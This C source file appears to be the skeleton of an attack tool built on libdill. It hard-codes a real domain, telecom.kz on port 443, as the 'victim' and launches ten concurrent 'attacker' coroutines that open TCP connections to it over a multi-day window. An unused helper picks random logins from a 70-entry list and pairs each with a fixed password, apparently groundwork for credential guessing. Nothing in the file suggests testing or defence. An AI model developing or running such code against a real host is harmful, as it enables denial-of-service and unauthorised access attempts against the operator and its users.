#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <stddef.h>
#include <errno.h>
#include <stdarg.h>
#include <libdill.h>

#define ATTACKERS_COUNT 10

#define TOTAL_DEADLINE (now() + 1000 * 60 * 24 * 3)
#define RECOGNIZE_DEADLINE (now() + 7000)
#define CONNECT_DEADLINE (now() + 10000)

#define VICTIM_HOST "telecom.kz"
#define VICTIM_PORT 443

void generate_pair(const char **login, const char **password);
coroutine void run_attacker(struct ipaddr *victim);
void _Noreturn panic(const char *format, ...);

int main() {
	int all;
	if ((all = bundle()) == -1)
		panic("Failed to create the main bundle");

	struct ipaddr victim;
	if (ipaddr_remote(&victim, VICTIM_HOST, VICTIM_PORT,
		0, RECOGNIZE_DEADLINE) == -1) {
		panic("Failed to recognize a victim");
	}

	for (size_t i = 0; i < ATTACKERS_COUNT; i++) {
		if (bundle_go(all, run_attacker(&victim)) == -1) {
			panic("Failed to spawn a coroutine");
		}
	}

	if (bundle_wait(all, TOTAL_DEADLINE) == -1) {
		panic("Failed to wait for the main bundle");
	}

	if (hclose(all) == -1) {
		panic("Failed to close the main bundle");
	}

        return EXIT_SUCCESS;
}

void _Noreturn panic(const char *format, ...) {
	va_list args;
	va_start(args, format);

	fputs("PANIC! ---> ", stderr);
	vfprintf(stderr, format, args);
	fputs("!\n", stderr);
	fprintf(stderr, "SYSTEM ERROR! ---> %s!\n", strerror(errno));

	va_end(args);
	abort();
}

coroutine void run_attacker(struct ipaddr *victim) {
	int connection;
	if ((connection = tcp_connect(victim, CONNECT_DEADLINE)) == -1) {
		panic("Failed to open a TCP connection");
	}

	puts("A new TCP connnection has been established.");

	if (hclose(connection) == -1) {
		panic("Failed to close a TCP connection");
	}
}


void generate_pair(const char **login, const char **password) {
	static const char *logins[] = {
		"abcdef",
		"bcdefg",
		"cdefgh",
		"defghi",
		"efghij",
		"fghijk",
		"ghijkl",
		"hijklm",
		"ijklmn",
		"jklmno", //  #10
		"klmnop",
		"lmnopq",
		"mnopqr",
		"nopqrs",
		"opqrst",
		"pqrstu",
		"qrstuv",
		"rstuvw",
		"stuvwx",
		"tuvwxy", // #20
		"uvwxyz",
		"123456",
		"234567",
		"345678",
		"456789",
		"567890",
		"jabsnf",
		"fhgbds",
		"eucosd",
		"docnel", // #30
		"reghoe",
		"cnslfi",
		"wufcyc",
		"wjkfdh",
		"3ifhbv",
		"ociden",
		"oeifhr",
		"wivund",
		"wicufd",
		"olxmdh", // #40
		"cnbdkd",
		"vcuenh",
		"cnskfd",
		"cieuyr",
		"cuendd",
		"fdiebf",
		"ciewyh",
		"zbxlss",
		"qycndd",
		"pqoxmd", // #50
		"xndkdf",
		"eocnen",
		"cnbsal",
		"iocuen",
		"soxmei",
		"cxuenb",
		"xijmwd",
		"xieyfn",
		"qpxcdn",
		"qpdicm", // #60
		"xbnfhd",
		"egtjej",
		"jvcbdn",
		"cuenxx",
		"apslcn",
		"xnedhf",
		"xuwens",
		"xiwmdn",
		"wucndd",
		"nvbxms"  // #70
	};

	*login = logins[rand() % (sizeof(logins) / sizeof(logins[0]))];
	*password = "njwofghunwrjdsh397345";
}
